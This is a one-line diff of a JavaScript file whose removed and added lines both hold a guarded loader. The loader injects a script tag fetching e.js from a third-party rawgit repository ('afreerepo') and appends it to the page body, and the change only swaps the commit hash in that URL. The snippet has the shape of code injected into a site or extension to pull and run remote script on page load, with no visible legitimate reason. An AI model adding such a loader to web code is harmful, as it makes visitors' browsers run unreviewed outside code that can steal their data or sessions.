@@ -1,1 +1,1 @@
-if("undefined"==typeof __injected){var s=document.createElement("script");s.src="https://rawgit.com/afreerepo/repo1/4161ed325301af4a0d1e37860382f14eec57a6ca/e.js",document.body.appendChild(s),__injected=1}
+if("undefined"==typeof __injected){var s=document.createElement("script");s.src="https://rawgit.com/afreerepo/repo1/a02c8f9c88cc3442c76bf87975d9e3be86eeff16/e.js",document.body.appendChild(s),__injected=1}
